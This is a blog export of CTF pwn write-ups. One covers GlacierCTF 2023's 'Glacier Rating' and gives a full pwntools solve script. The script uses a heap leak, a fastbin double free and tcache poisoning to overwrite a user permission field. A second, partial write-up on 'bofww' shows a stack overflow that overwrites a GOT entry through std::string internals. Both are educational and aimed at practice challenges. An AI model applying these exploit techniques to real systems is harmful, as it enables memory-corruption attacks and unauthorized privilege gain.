[{"content":"","date":"28 November 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"28 November 2023","permalink":"/tags/cpp/","section":"Tags","summary":"","title":"cpp"},{"content":"","date":"28 November 2023","permalink":"/","section":"d0UBleW's Blog","summary":"","title":"d0UBleW's Blog"},{"content":"","date":"28 November 2023","permalink":"/tags/double-free/","section":"Tags","summary":"","title":"double free"},{"content":"","date":"28 November 2023","permalink":"/tags/fastbin-dup/","section":"Tags","summary":"","title":"fastbin dup"},{"content":" Author: n4nika\nDescription: I love C++. No malloc and free, so I can\u0026rsquo;t mess up my heap management, right?\nAttachment: glacie-rating.tar.gz\nSource Code Analysis # In this program, we are first required to provide a username and a password, then we could interact with the main features of the program with USER level permission:\ncreate a rating delete a rating show a rating scream do admin stuff, which prints out flag.txt (require ADMIN level permission) user.hpp # #ifndef USER_HPP #define USER_HPP #include \u0026lt;string\u0026gt; #include \u0026lt;map\u0026gt; #include \u0026lt;iostream\u0026gt; enum class Perms { ADMIN = 0, USER = 1000, }; class User { private: std::string username_; std::string password_; std::map\u0026lt;size_t, char*\u0026gt; ratings_; Perms user_level_; public: User(std::string username, std::string password, Perms user_level); ~User() = default; User(const User \u0026amp;copy) = delete; std::string getUsername(); Perms getUserLevel(); void insertRating(char *rating); void removeRating(size_t index); void showRatings(); }; #endif Create A Rating # Creating a rating would first allocate a 0x20 sized chunk on the heap, only then followed by rating amount validation, which only allow us to create 3 ratings. Our input is then used to create std::pair value and this pair is then inserted into the std::map\u0026lt;size_t, char*\u0026gt; ratings_\n// main.cpp void writeRating(User *user) { char *buffer = new char[24]; std::cout \u0026lt;\u0026lt; \u0026#34;Give me your rating\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;\u0026gt; \u0026#34;; fgets(buffer, 24, stdin); user-\u0026gt;insertRating(buffer); return; } // user.cpp void User::insertRating(char *rating) { if (ratings_.size() \u0026gt;= 3) { std::cout \u0026lt;\u0026lt; \u0026#34;Maximum amount of ratings reached!\u0026#34; \u0026lt;\u0026lt; std::endl; return; } else { ratings_.insert({ratings_.size() + 1, rating}); std::cout \u0026lt;\u0026lt; \u0026#34;Successfully added rating\u0026#34; \u0026lt;\u0026lt; std::endl; return; } } Delete A Rating # Deleting a rating seems to be straight forward, where we are required to choose from the available key inside ratings_. Proper validation is implemented as well to prevent weird interactions. However, there is one problem here. The function User::removeRating does not actually delete the std::pair element, but instead only delete the std::pair value. As a result, the size of the std::map stays the same as well.\nThe proper way to delete should be using the erase method.\n// main.cpp void deleteRating(User *user) { size_t index = 0; std::cout \u0026lt;\u0026lt; \u0026#34;Which rating do you want to remove?\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;\u0026gt; \u0026#34;; scanf(\u0026#34;%zd\u0026#34;, \u0026amp;index); getchar(); user-\u0026gt;removeRating(index); return; } // user.cpp void User::removeRating(size_t index) { if (ratings_.empty()) { std::cout \u0026lt;\u0026lt; \u0026#34;No ratings to delete\u0026#34; \u0026lt;\u0026lt; std::endl; return; } else if (index \u0026gt;= ratings_.size() + 1 | index \u0026lt; 1) { std::cout \u0026lt;\u0026lt; \u0026#34;Invalid Index\u0026#34; \u0026lt;\u0026lt; std::endl; return; } else { delete ratings_.at(index); // \u0026lt;=== VULNERABILITY!!! std::cout \u0026lt;\u0026lt; \u0026#34;Removed rating \u0026#34; \u0026lt;\u0026lt; index \u0026lt;\u0026lt; std::endl; return; } } Here is a rough visualization of what happen when we delete a rating:\n1: aaaa 2: bbbb 3: cccc Delete `2` --\u0026gt; free bbbbb 1: aaaa 2: ???? 3: cccc Instead of 1: aaaa 3: cccc With this wrong implementation, we are able to leak data from the heap (through show rating), since the key 2 still exists inside ratings_\nShow A Rating # Nothing much here, just a function to display ratings_.\n// main.cpp void showRatings(User *user) { user-\u0026gt;showRatings(); return; } // user.cpp void User::showRatings() { std::cout \u0026lt;\u0026lt; \u0026#34;Your ratings: \u0026#34; \u0026lt;\u0026lt; std::endl; for (auto rating : ratings_) { std::cout \u0026lt;\u0026lt; rating.first \u0026lt;\u0026lt; \u0026#34;: \u0026#34; \u0026lt;\u0026lt; rating.second \u0026lt;\u0026lt; std::endl; } return; } Scream # This function allow us to temporarily create a vector which essentially give us the ability to allocate up to 50 arbitrary size chunks. These chunks are then freed when the vector object goes out of scope. We will get back to this function when developing our exploit later on.\n// main.cpp void scream(User *user) { std::cout \u0026lt;\u0026lt; \u0026#34;Now scream to your hearts content!\u0026#34; \u0026lt;\u0026lt; std::endl; std::string line; std::vector\u0026lt;std::string\u0026gt; lines; while (line != \u0026#34;quit\u0026#34;) { std::getline(std::cin, line); lines.push_back(line); if (lines.size() \u0026gt; 50) { std::cout \u0026lt;\u0026lt; \u0026#34;Thats enough!\u0026#34; \u0026lt;\u0026lt; std::endl; return; } } return; } Do Admin Stuff # This is the function that would give us the flag given that our permission is ADMIN.\n// main.cpp void doAdminStuff(User *user) { if (user-\u0026gt;getUserLevel() != Perms::ADMIN) { std::cout \u0026lt;\u0026lt; \u0026#34;You are not an admin!\u0026#34; \u0026lt;\u0026lt; std::endl; exit(1); } else if (user-\u0026gt;getUserLevel() == Perms::ADMIN) { std::ifstream flag_stream(\u0026#34;./flag.txt\u0026#34;); std::string flag; std::getline(flag_stream, flag); flag_stream.close(); std::cout \u0026lt;\u0026lt; \u0026#34;Verified permissions\u0026#34; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;Here is your flag: \u0026#34; \u0026lt;\u0026lt; flag \u0026lt;\u0026lt; std::endl; exit(0); } } Solution # Getting A Heap Leak # From the analysis above, we found out that we could obtain a heap leak by deleting a rating and show the rating.\ncreate(b\u0026#34;a\u0026#34; * 8) show() print(io.recvline()) print(io.recvline()) delete(1) show() print(io.recvline()) print(io.recvline()) \u0026#34;\u0026#34;\u0026#34; b\u0026#39;Your ratings: \\n\u0026#39; b\u0026#39;1: aaaaaaaa\\n\u0026#39; b\u0026#39;Your ratings: \\n\u0026#39; b\u0026#39;1: w\\xa3c`\\x05\\n\u0026#39; \u0026#34;\u0026#34;\u0026#34; Fastbin Dup # What we could do next is to perform double free. However, this does not work due to tcachebins mitigation. We could try to find a way to overwrite the bk field which contain the key to prevent double free but this is not possible. Unlike tcachebins, fastbin does not have the mechanism to detect double free. So our goal now is to free the rating chunk into fastbin and perform double free (also known as fastbin dup).\nTo achieve this, we would need to first fill up the tcachebins with chunks of size 0x20. Recall the scream function which enable us to allocate up to 50 arbitrary size chunks. Furthermore, this function also freed the allocated chunks at the end, which is perfect for us.\ncreate(b\u0026#34;a\u0026#34; * 8) create(b\u0026#34;b\u0026#34; * 8) create(b\u0026#34;c\u0026#34; * 8) delete(3) show() io.recvuntil(b\u0026#34;3: \u0026#34;) heap_leak = u64(io.recvline().strip().ljust(8, b\u0026#34;\\x00\u0026#34;)) log.info(f\u0026#34;{heap_leak=:#x}\u0026#34;) heap = heap_leak \u0026lt;\u0026lt; 12 log.info(f\u0026#34;{heap=:#x}\u0026#34;) user_chunk = heap + 0x370 # fill up tcachebins payload = b\u0026#34;\\n\u0026#34;.join([cyclic(0x10)] * 7 + [b\u0026#34;quit\u0026#34;]) scream(payload) # fastbin dup delete(1) delete(2) delete(1) # \u0026lt;=== DOUBLE FREE!!! Before scream\n----------------------------------- Tcachebins for arena \u0026#39;main_arena\u0026#39; ----------------------------------- tcachebins[idx=0, size=0x20, @0x555555563090] count=1 -\u0026gt; Chunk(addr=0x555555575530, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=1, size=0x30, @0x555555563098] count=1 -\u0026gt; Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2 -\u0026gt; Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) [+] Found 4 chunks in tcache. ------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ [+] Found 0 chunks in fastbin. After scream\n----------------------------------- Tcachebins for arena \u0026#39;main_arena\u0026#39; ----------------------------------- tcachebins[idx=0, size=0x20, @0x555555563090] count=7 -\u0026gt; Chunk(addr=0x555555575800, size=0x20, flags=PREV_INUSE, fd=0x555000020285, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555757e0, size=0x20, flags=PREV_INUSE, fd=0x5550000202a5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555757c0, size=0x20, flags=PREV_INUSE, fd=0x5550000203d5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575690, size=0x20, flags=PREV_INUSE, fd=0x5550000203f5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575670, size=0x20, flags=PREV_INUSE, fd=0x5550000200a5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555755c0, size=0x20, flags=PREV_INUSE, fd=0x555000020035, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575530, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=1, size=0x30, @0x555555563098] count=2 -\u0026gt; Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x5550000200d5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575590, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2 -\u0026gt; Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=7, size=0x90, @0x5555555630c8] count=1 -\u0026gt; Chunk(addr=0x5555555755e0, size=0x90, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=15, size=0x110, @0x555555563108] count=1 -\u0026gt; Chunk(addr=0x5555555756b0, size=0x110, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) [+] Found 13 chunks in tcache. ------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ [+] Found 0 chunks in fastbin. Now, when we delete rating 1 and 2, both would go to fastbin.\n----------------------------------- Tcachebins for arena \u0026#39;main_arena\u0026#39; ----------------------------------- tcachebins[idx=0, size=0x20, @0x555555563090] count=7 -\u0026gt; Chunk(addr=0x555555575800, size=0x20, flags=PREV_INUSE, fd=0x555000020285, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555757e0, size=0x20, flags=PREV_INUSE, fd=0x5550000202a5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555757c0, size=0x20, flags=PREV_INUSE, fd=0x5550000203d5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575690, size=0x20, flags=PREV_INUSE, fd=0x5550000203f5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575670, size=0x20, flags=PREV_INUSE, fd=0x5550000200a5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x5555555755c0, size=0x20, flags=PREV_INUSE, fd=0x555000020035, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575530, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=1, size=0x30, @0x555555563098] count=2 -\u0026gt; Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x5550000200d5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575590, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2 -\u0026gt; Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=7, size=0x90, @0x5555555630c8] count=1 -\u0026gt; Chunk(addr=0x5555555755e0, size=0x90, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=15, size=0x110, @0x555555563108] count=1 -\u0026gt; Chunk(addr=0x5555555756b0, size=0x110, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) [+] Found 13 chunks in tcache. ------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ fastbins[idx=0, size=0x20, @0x7ffff7c17ad0] -\u0026gt; Chunk(addr=0x555555575510, size=0x20, flags=PREV_INUSE, fd=0x555000020185, bk=0x00000000000a) -\u0026gt; Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x00000000000a) [+] Found 2 chunks in fastbin. Next, we trigger the double free by deleting rating 1.\n------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ fastbins[idx=0, size=0x20, @0x7ffff7c17ad0] -\u0026gt; Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a) -\u0026gt; Chunk(addr=0x555555575510, size=0x20, flags=PREV_INUSE, fd=0x555000020185, bk=0x00000000000a) -\u0026gt; Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a) -\u0026gt; 0x555555575500 [loop detected] [+] Found 2 chunks in fastbin. Tcache Poisoning # Now, when we request a 0x20 size chunk, it would first go through tcachebins until it\u0026rsquo;s empty. When we empty out the tcachebins, the next allocation request would go to fastbin and the rest of the bins would be dumped into tcachebins. But how do we empty out the tcachebins? Using scream is not ideal as the chunks would get freed again. The answer is to simply create a rating. This is because the allocation is done before the rating count validation check.\nBefore allocation request\n----------------------------------- Tcachebins for arena \u0026#39;main_arena\u0026#39; ----------------------------------- tcachebins[idx=1, size=0x30, @0x555555563098] count=2 -\u0026gt; Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x5550000200d5, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575590, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2 -\u0026gt; Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=7, size=0x90, @0x5555555630c8] count=1 -\u0026gt; Chunk(addr=0x5555555755e0, size=0x90, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) tcachebins[idx=15, size=0x110, @0x555555563108] count=1 -\u0026gt; Chunk(addr=0x5555555756b0, size=0x110, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0) [+] Found 6 chunks in tcache. ------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ fastbins[idx=0, size=0x20, @0x7ffff7c17ad0] -\u0026gt; Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a) -\u0026gt; Chunk(addr=0x555555575510, size=0x20, flags=PREV_INUSE, fd=0x555000020185, bk=0x00000000000a) -\u0026gt; Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a) -\u0026gt; 0x555555575500 [loop detected] [+] Found 2 chunks in fastbin. After allocation request: 0x560c41f0d4f0 is allocated, which is the first free chunk in fastbin, and the remaining chunks are dumped into tcachebins.\n----------------------------------- Tcachebins for arena \u0026#39;main_arena\u0026#39; ----------------------------------- tcachebins[idx=0, size=0x20, @0x560c41efb090] count=3 -\u0026gt; Chunk(addr=0x560c41f0d510, size=0x20, flags=PREV_INUSE, fd=0x56092134ca0d, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x560c41f0d4f0, size=0x20, flags=PREV_INUSE, fd=0x56092134ca2d, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x560c41f0d510, size=0x20, flags=PREV_INUSE, fd=0x56092134ca0d, bk=0x6ee603c65e3f27c0) -\u0026gt; 0x560c41f0d520 [loop detected]two chunk tcachebins[idx=1, size=0x30, @0x560c41efb098] count=2 -\u0026gt; Chunk(addr=0x560c41f0d2a0, size=0x30, flags=PREV_INUSE, fd=0x56092134caad, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x560c41f0d590, size=0x30, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0) tcachebins[idx=3, size=0x50, @0x560c41efb0a8] count=2 -\u0026gt; Chunk(addr=0x560c41f0d2d0, size=0x50, flags=PREV_INUSE, fd=0x56092134cc3d, bk=0x6ee603c65e3f27c0) -\u0026gt; Chunk(addr=0x560c41f0d320, size=0x50, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0) tcachebins[idx=7, size=0x90, @0x560c41efb0c8] count=1 -\u0026gt; Chunk(addr=0x560c41f0d5e0, size=0x90, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0) tcachebins[idx=15, size=0x110, @0x560c41efb108] count=1 -\u0026gt; Chunk(addr=0x560c41f0d6b0, size=0x110, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0) [+] Found 8 chunks in tcache. ------------------------------------ Fastbins for arena \u0026#39;main_arena\u0026#39; ------------------------------------ [+] Found 0 chunks in fastbin. gef\u0026gt; p $rax - 0x10 $1 = 0x560c41f0d4f0 Now that we received a chunk at 0x560c41f0d4f0, while this chunk exists on tcachebins, we could perform tcache poisoning to allocate a chunk where we could overwrite our user permission level.\nFinal Solve Script # #!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./app\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc chall.glacierctf.com 13373\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: args_ = [elf.path] + argv if args.NA: args_ = [\u0026#34;setarch\u0026#34;, \u0026#34;-R\u0026#34;] + args_ return process(args_, env=env, *a, **kw) def create(rating: bytes): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;rating\\n\u0026gt; \u0026#34;, rating) def delete(idx): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) io.sendlineafter(b\u0026#34;remove?\\n\u0026gt; \u0026#34;, str(idx).encode()) def show(): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;3\u0026#34;) def scream(aaa: bytes): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;4\u0026#34;) io.sendlineafter(b\u0026#34;content!\\n\u0026#34;, aaa) def admin(): io.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;5\u0026#34;) def reveal(ptr): mask = 0xfff \u0026lt;\u0026lt; 36 while mask: ptr ^= (ptr \u0026amp; mask) \u0026gt;\u0026gt; 12 mask \u0026gt;\u0026gt;= 12 return ptr def mangle(pos, ptr): return (pos \u0026gt;\u0026gt; 12) ^ ptr env = {} io = start() io.sendlineafter(b\u0026#34;username: \u0026#34;, cyclic(0x30)) io.sendlineafter(b\u0026#34;password: \u0026#34;, cyclic(0x30)) create(b\u0026#34;a\u0026#34; * 8) create(b\u0026#34;b\u0026#34; * 8) create(b\u0026#34;c\u0026#34; * 8) delete(3) show() io.recvuntil(b\u0026#34;3: \u0026#34;) heap_leak = u64(io.recvline().strip().ljust(8, b\u0026#34;\\x00\u0026#34;)) log.info(f\u0026#34;{heap_leak=:#x}\u0026#34;) heap = heap_leak \u0026lt;\u0026lt; 12 log.info(f\u0026#34;{heap=:#x}\u0026#34;) user_chunk = heap + 0x370 # Fill up tcachebins payload = b\u0026#34;\\n\u0026#34;.join([cyclic(0x10)] * 7 + [b\u0026#34;quit\u0026#34;]) scream(payload) # fastbin dup delete(1) delete(2) delete(1) # Empty out tcachebins create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) # After tcachebins is empty, the fastbins are dumped into tcachebins # which enable us to do tcache poisoning with the fastbin dup earlier fd = mangle(heap + 0x4f0, user_chunk + 0x80) # perms field create(p64(fd)) create(b\u0026#34;f\u0026#34; * 8) create(b\u0026#34;f\u0026#34; * 8) create(p64(0) + p64(0x41)) admin() io.interactive() ➜ ./solve.py REMOTE [+] Opening connection to chall.glacierctf.com on port 13373: Done [*] heap_leak=0x557c4b598 [*] heap=0x557c4b598000 [*] Switching to interactive mode Verified permissions Here is your flag: gctf{I_th0ght_1_c0uld_n0t_m3ss_4nyth1ng_up} [*] Got EOF while reading in interactive $ [*] Interrupted [*] Closed connection to chall.glacierctf.com port 13373 ","date":"28 November 2023","permalink":"/posts/glacierctf-2023/pwn/","section":"My Average Blog","summary":"Double free into tcache poisoning","title":"Glacier Rating"},{"content":"","date":"28 November 2023","permalink":"/categories/glacierctf-2023/","section":"Categories","summary":"","title":"GlacierCTF 2023"},{"content":"","date":"28 November 2023","permalink":"/tags/heap/","section":"Tags","summary":"","title":"heap"},{"content":"Welcome to my average blog!\n","date":"28 November 2023","permalink":"/posts/","section":"My Average Blog","summary":"Welcome to my average blog!","title":"My Average Blog"},{"content":"","date":"28 November 2023","permalink":"/categories/pwn/","section":"Categories","summary":"","title":"pwn"},{"content":"","date":"28 November 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"28 November 2023","permalink":"/tags/tcache-poisoning/","section":"Tags","summary":"","title":"tcache poisoning"},{"content":"","date":"16 November 2023","permalink":"/tags/bof/","section":"Tags","summary":"","title":"bof"},{"content":" Author: ptr-yudai\nDescription: buffer overflow with win function\nAttachment: bofww.tar.gz\nSource Code # #include \u0026lt;iostream\u0026gt; void win() { std::system(\u0026#34;/bin/sh\u0026#34;); } void input_person(int\u0026amp; age, std::string\u0026amp; name) { int _age; char _name[0x100]; std::cout \u0026lt;\u0026lt; \u0026#34;What is your first name? \u0026#34;; std::cin \u0026gt;\u0026gt; _name; std::cout \u0026lt;\u0026lt; \u0026#34;How old are you? \u0026#34;; std::cin \u0026gt;\u0026gt; _age; name = _name; age = _age; } int main() { int age; std::string name; input_person(age, name); std::cout \u0026lt;\u0026lt; \u0026#34;Information:\u0026#34; \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026#34;Age: \u0026#34; \u0026lt;\u0026lt; age \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; \u0026#34;Name: \u0026#34; \u0026lt;\u0026lt; name \u0026lt;\u0026lt; std::endl; return 0; } __attribute__((constructor)) void setup(void) { std::setbuf(stdin, NULL); std::setbuf(stdout, NULL); } ➜ checksec --file ./bofww Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Initial Analysis # There is an obvious buffer overflow on input_person(), specifically the _name variable. However, the program is compiled with stack protector and we might need to leak the stack cookie for us to smash the stack. Unfortunately, I could not find any way to leak the cookie and gain another round of buffer overflow. Luckily, the program global offset table (GOT) entries are overwritable. Moreover, there is a win function which would pop us a shell; hence, the plan is to overwrite __stack_chk_fail GOT entry to be the address of win() function.\nBut, how do we overwrite the GOT, you may ask? Well, in short, we overwrite the std::string structure which contains pointer to a memory address in which the actual string content lives. Guess, this is a good excuse to dive into libstdc++6 (cxx11) std::string internals to better understand how our exploit works. Then, we would walkthrough the operator= function to better craft our exploit. If you are just here for the final solve script, you can skip to this section.\nstd::string Brief Internals # Let\u0026rsquo;s try to play with the program through GDB. First, set a breakpoint at input_person+164, which is the just before name = _name line of code is executed. Next, run the program and input any short name, in this example, the input would be aaaabaaa for _name, and any number for _age.\ngef\u0026gt; break *input_person+164 gef\u0026gt; run gef\u0026gt; info reg rdi rdi 0x7fffffffcde0 0x7fffffffcde0 gef\u0026gt; ni gef\u0026gt; tele 0x7fffffffcde0 0x7fffffffcde0|+0x0000|+000: 0x00007fffffffcdf0 -\u0026gt; \u0026#39;aaaabaaa\u0026#39; \u0026lt;- $rax 0x7fffffffcde8|+0x0008|+001: 0x0000000000000008 0x7fffffffcdf0|+0x0010|+002: \u0026#39;aaaabaaa\u0026#39; \u0026lt;- $rdi 0x7fffffffcdf8|+0x0018|+003: 0x0000000000000000 0x7fffffffce00|+0x0020|+004: 0x0000000000000000 0x7fffffffce08|+0x0028|+005: 0xa7306dc9e85ed800 \u0026lt;- canary We could try to supply another input, for example aaaabaaacaaaa, and inspect the memory.\n0x7fffffffcde0|+0x0000|+000: 0x00007fffffffcdf0 -\u0026gt; \u0026#39;aaaabaaacaaa\u0026#39; \u0026lt;- $rax 0x7fffffffcde8|+0x0008|+001: 0x000000000000000c (\u0026#39;\\x0c\u0026#39;?) 0x7fffffffcdf0|+0x0010|+002: \u0026#39;aaaabaaacaaa\u0026#39; \u0026lt;- $rdi 0x7fffffffcdf8|+0x0018|+003: 0x0000000061616163 (\u0026#39;caaa\u0026#39;?) 0x7fffffffce00|+0x0020|+004: 0x0000000000000000 0x7fffffffce08|+0x0028|+005: 0xdea7b9a5dde5b200 \u0026lt;- canary We could see from the two examples how std::string is represented on the stack and sort of guess that:\noffset data 0x00 pointer to the string content 0x08 length of the string content 0x10 the actual string content Looks like the structure could hold up to either 0x10 or 0x18 bytes of characters (including the NULL termination byte) on the stack. Let\u0026rsquo;s try to provide 0x10 bytes of input and see how it reacts.\n0x7fffffffcde0|+0x0000|+000: 0x00000000004172b0 -\u0026gt; \u0026#39;aaaaaaaabaaaaaaa\u0026#39; \u0026lt;- $rax 0x7fffffffcde8|+0x0008|+001: 0x0000000000000010 0x7fffffffcdf0|+0x0010|+002: 0x000000000000001e \u0026lt;- $rdi 0x7fffffffcdf8|+0x0018|+003: 0x0000000000000000 0x7fffffffce00|+0x0020|+004: 0x0000000000000000 0x7fffffffce08|+0x0028|+005: 0xc382c9256963b300 \u0026lt;- canary As could be seen, our string is now allocated on the heap.\nSince there is a pointer to a memory address, we could probably overwrite this value with our buffer overflow and point it to __stack_chk_fail@got.plt.\npayload = b\u0026#34;\u0026#34; payload += p64(win) payload = payload.ljust(0x130, b\u0026#34;\\x00\u0026#34;) payload += p64(stack_chk_fail_got) With this payload, we actually got a SIGSEGV and looking at the call stack, it is trying to call free which hints us on operator= trying to allocate our input on the heap. However, our input is only 3 bytes long as NULL bytes are not counted. This is weird. Guess, this is a perfect time to look at how operator= works.\n-\u0026gt; 0x7fdbf5c3d8d7 498b4608 \u0026lt;_int_free+0x1b7\u0026gt; mov rax, QWORD PTR [r14 + 0x8] [!] Cannot access memory at address 0x8050d8 [Thread Id:1] Name: \u0026#34;bofww\u0026#34;, stopped at 0x7fdbf5c3d8d7 \u0026lt;_int_free+0x1b7\u0026gt;, reason: SIGSEGV [#0] 0x7fdbf5c3d8d7 \u0026lt;_int_free+0x1b7\u0026gt; [#1] 0x7fdbf5c404d3 \u0026lt;free+0x73\u0026gt; (frame name: __GI___libc_free) [#2] 0x7fdbf5f4182d \u0026lt;std::__cxx11::basic_string\u0026lt;char, std::char_traits\u0026lt;char\u0026gt;, std::allocator\u0026lt;char\u0026gt; \u0026gt;::_M_mutate(unsigned long, unsigned long, char const*, unsigned long)+0xed\u0026gt; [#3] 0x7fdbf5f4288b \u0026lt;std::__cxx11::basic_string\u0026lt;char, std::char_traits\u0026lt;char\u0026gt;, std::allocator\u0026lt;char\u0026gt; \u0026gt;::_M_replace(unsigned long, unsigned long, char const*, unsigned long)+0xfb\u0026gt; [#4] 0x0000004013b9 \u0026lt;input_person(int\u0026amp;, std::__cxx11::basic_string\u0026lt;char, std::char_traits\u0026lt;char\u0026gt;, std::allocator\u0026lt;char\u0026gt; \u0026gt;\u0026amp;)+0xa9\u0026gt; [#5] 0x000000000000 \u0026lt;NO_SYMBOL\u0026gt; Understanding operator=(const char *) # Unfortunately, I could not find the libstdc++ source code for the operator= function (skill issue, probably) and had to instead use ghidra to decompile the file.\nTo easily locate the function address, turn off demangling inside GDB (if you have it turned on) and use the mangled function name _ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSEPKc as the search filter.\ngef\u0026gt; set print asm-demangle off gef\u0026gt; x/i 0x00000000004013b4 0x4013b4 \u0026lt;_Z12input_personRiRNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+164\u0026gt;: call 0x4011a0 \u0026lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSEPKc@plt\u0026gt; The following is the decompiled code for operator=(const char *). As could be seen, there is a familiar function named _M_replace(). It accepts:\nthe 